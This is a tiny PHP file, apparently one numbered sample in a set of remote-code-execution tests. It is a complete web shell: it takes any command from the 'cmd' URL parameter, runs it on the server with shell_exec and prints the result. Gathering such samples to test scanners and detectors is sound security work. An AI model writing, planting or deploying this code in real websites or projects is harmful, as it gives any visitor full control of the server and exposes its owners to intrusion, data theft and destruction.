<?php
// RCE test variation #1152
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>